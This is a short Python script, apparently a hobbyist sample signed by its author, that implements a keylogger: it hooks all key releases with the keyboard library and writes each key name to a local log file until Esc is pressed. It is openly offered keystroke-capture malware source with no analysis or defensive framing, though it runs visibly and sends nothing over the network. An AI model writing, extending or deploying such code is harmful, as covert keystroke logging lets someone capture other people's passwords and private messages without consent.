import keyboard

def keylogger():
    # Open a file to write the keystrokes
    with open("keystrokes_log.txt", "w") as log_file:
        log_file.write("Keylogger Started...\n")
        
        # Start capturing keystrokes
        keyboard.on_release(callback=lambda event: log_file.write(f"{event.name} pressed.\n"))
        
        print("Keylogger is running. Press 'Esc' to stop...")
        
        # Wait for the user to press 'Esc' to stop the keylogger
        keyboard.wait("esc")
        
        print("Keylogger stopped.")
        log_file.write("Keylogger Stopped.")
        print("Coded by ADITYA ZALTE!")

if __name__ == "__main__":
    keylogger()
